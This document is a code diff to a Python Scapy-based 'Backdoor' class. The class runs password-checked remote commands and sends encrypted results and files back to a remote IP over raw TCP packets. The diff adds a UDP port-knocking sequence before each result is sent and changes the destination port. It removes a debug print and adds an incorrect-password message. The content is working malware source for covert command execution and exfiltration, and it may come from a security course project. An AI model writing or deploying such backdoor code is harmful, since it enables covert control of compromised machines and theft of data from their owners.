@@ -44,6 +44,7 @@ class Backdoor(object):
         cmd = payload[8:]
 
         if pwd not in self.password:
+            print("Incorrect password")
             return
         else:
             self.executeCmd(cmd)
@@ -75,9 +76,12 @@ class Backdoor(object):
         time.sleep(0.1)
 
     def sendResult(self, data):
+        knocker = self.portKnocking(self.knockList)
+        time.sleep(3)
+
         payload = encryption.encrypt(self.password + data)
 
-        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.listenPort, sport=self.localPort)/Raw(load=payload)
+        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
         send(packet, verbose=False)
 
     def sendFile(self, filename):
@@ -94,7 +98,6 @@ class Backdoor(object):
 
     def portKnocking(self, knockList):
         for port in knockList:
-            print(port)
             pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(sport=self.localPort, dport=int(port))
             send(pkt, verbose=False)
             time.sleep(0.1)
